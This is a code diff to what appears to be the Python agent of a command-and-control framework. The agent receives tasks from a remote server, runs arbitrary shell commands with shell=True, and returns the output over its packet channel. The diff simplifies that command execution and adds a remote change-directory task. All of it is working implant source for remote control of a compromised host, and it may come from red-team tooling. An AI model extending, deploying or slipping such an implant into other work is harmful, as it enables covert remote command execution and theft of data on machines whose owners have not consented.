@@ -1,19 +1,14 @@
 import base64
 import datetime
-import grp
 import http.server
 import io
 import json
-import numbers
 import os
 import platform
 import pwd
 import queue as Queue
-import re
 import secrets
-import shutil
 import socket
-import stat
 import struct
 import subprocess
 import sys
@@ -35,17 +30,6 @@ import hmac
 ################################################
 moduleRepo = {}
 _meta_cache = {}
-
-
-def old_div(a, b):
-    """
-    Equivalent to ``a / b`` on Python 2 without ``from __future__ import
-    division``.
-    """
-    if isinstance(a, numbers.Integral) and isinstance(b, numbers.Integral):
-        return a // b
-    else:
-        return a / b
 
 
 ################################################
@@ -392,20 +376,37 @@ class MainAgent:
 
     def run_prebuilt_command(self, data, result_id):
         """
-        Run a command on the system and return the results.
+        Run a shell command on the system and return the results.
         Task 40
         """
-        parts = data.split(" ")
-        if len(parts) == 1:
-            data = parts[0]
-            result_data = str(self.run_command(data))
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(40, result_data, result_id))
-        else:
-            cmd = parts[0]
-            cmdargs = " ".join(parts[1: len(parts)])
-            result_data = str(self.run_command(cmd, cmdargs=cmdargs))
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(40, result_data, result_id))
+        if data.startswith("shell "):
+            data = data[len("shell "):]
+        result_data = str(self.run_command(data))
+        self.packet_handler.send_message(
+            self.packet_handler.build_response_packet(40, result_data, result_id)
+        )
         self.tasks[result_id]["status"] = "completed"
+
+    def change_directory(self, data, result_id):
+        """
+        Change the agent's working directory.
+        Task 44. On success returns the new cwd as TASK_CHDIR (44).
+        On OSError returns "[!] chdir failed: <err>" as ERROR (0) so the
+        server marks the task as errored and the operator sees red.
+        """
+        try:
+            os.chdir(data)
+            result_data = os.getcwd()
+            packet_type = 44
+            status = "completed"
+        except OSError as e:
+            result_data = "[!] chdir failed: {}".format(e)
+            packet_type = 0
+            status = "error"
+        self.packet_handler.send_message(
+            self.packet_handler.build_response_packet(packet_type, result_data, result_id)
+        )
+        self.tasks[result_id]["status"] = status
 
     def file_download(self, data, result_id):
         """
@@ -780,120 +781,20 @@ class MainAgent:
         httpServer.server_close()
         return
 
-    def permissions_to_unix_name(self, st_mode):
-        permstr = ""
-        usertypes = ["USR", "GRP", "OTH"]
-        for usertype in usertypes:
-            perm_types = ["R", "W", "X"]
-            for permtype in perm_types:
-                perm = getattr(stat, "S_I%s%s" % (permtype, usertype))
-                if st_mode & perm:
-                    permstr += permtype.lower()
-                else:
-                    permstr += "-"
-        return permstr
-
-    def directory_listing(self, path):
-        # directory listings in python
-        # https://www.opentechguides.com/how-to/article/python/78/directory-file-list.html
-
-        res = ""
-        for fn in os.listdir(path):
-            fstat = os.stat(os.path.join(path, fn))
-            permstr = self.permissions_to_unix_name(fstat[0])
-
-            if os.path.isdir(fn):
-                permstr = "d{}".format(permstr)
-            else:
-                permstr = "-{}".format(permstr)
-
-            user = pwd.getpwuid(fstat.st_uid)[0]
-            group = grp.getgrgid(fstat.st_gid)[0]
-
-            # Convert file size to MB, KB or Bytes
-            fsize = fstat.st_size
-            unit = "B"
-
-            if fsize > 1024:
-                fsize >>= 10
-                unit = "KB"
-
-            if fsize > 1024:
-                fsize >>= 10
-                unit = "MB"
-
-            mtime = time.strftime("%X %x", time.gmtime(fstat.st_mtime))
-
-            res += "{} {} {} {:18s} {:f} {:2s} {:15.15s}\n".format(
-                permstr, user, group, mtime, fsize, unit, fn
-            )
-
-        return res
-
     # additional implementation methods
-    def run_command(self, command, cmdargs=None):
-        if command == "shell":
-            if cmdargs is None:
-                return "no shell command supplied"
+    def run_command(self, command):
+        if not command:
+            return "no shell command supplied"
 
-            p = subprocess.Popen(
-                cmdargs,
-                stdin=None,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT,
-                shell=True,
-            )
-            return p.communicate()[0].strip().decode("UTF-8")
-        elif re.compile("(ls|dir)").match(command):
-            if cmdargs == None or not os.path.exists(cmdargs):
-                cmdargs = "."
-
-            return self.directory_listing(cmdargs)
-        elif re.compile("cd").match(command):
-            os.chdir(cmdargs)
-            return str(os.getcwd())
-        elif re.compile("pwd").match(command):
-            return str(os.getcwd())
-        elif re.compile("rm").match(command):
-            if cmdargs is None:
-                return "please provide a file or directory"
-
-            if os.path.exists(cmdargs):
-                if os.path.isfile(cmdargs):
-                    os.remove(cmdargs)
-                    return "done."
-                elif os.path.isdir(cmdargs):
-                    shutil.rmtree(cmdargs)
-                    return "done."
-                else:
-                    return "unsupported file type"
-            else:
-                return "specified file/directory does not exist"
-        elif re.compile("mkdir").match(command):
-            if cmdargs is None:
-                return "please provide a directory"
-
-            os.mkdir(cmdargs)
-            return "Created directory: {}".format(cmdargs)
-
-        elif re.compile("(whoami|getuid)").match(command):
-            return pwd.getpwuid(os.getuid())[0]
-
-        elif re.compile("hostname").match(command):
-            return str(socket.gethostname())
-
-        else:
-            if cmdargs is not None:
-                command = "{} {}".format(command, cmdargs)
-
-            p = subprocess.Popen(
-                command,
-                stdin=None,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT,
-                shell=True,
-            )
-            return p.communicate()[0].strip().decode("UTF-8")
+        p = subprocess.Popen(
+            command,
+            stdin=None,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            shell=True,
+        )
+        # errors="replace" tolerates non-UTF8 console output (e.g. CP1252 on Windows).
+        return p.communicate()[0].strip().decode("utf-8", errors="replace")
 
     def get_file_part(self, filePath, offset=0, chunkSize=512000, base64=True):
         if not os.path.exists(filePath):
@@ -1019,6 +920,9 @@ class MainAgent:
 
             elif packet_type == 43:
                 self.directory_list(data, result_id)
+
+            elif packet_type == 44:
+                self.change_directory(data, result_id)
 
             elif packet_type == 50:
                 self.job_list(result_id)
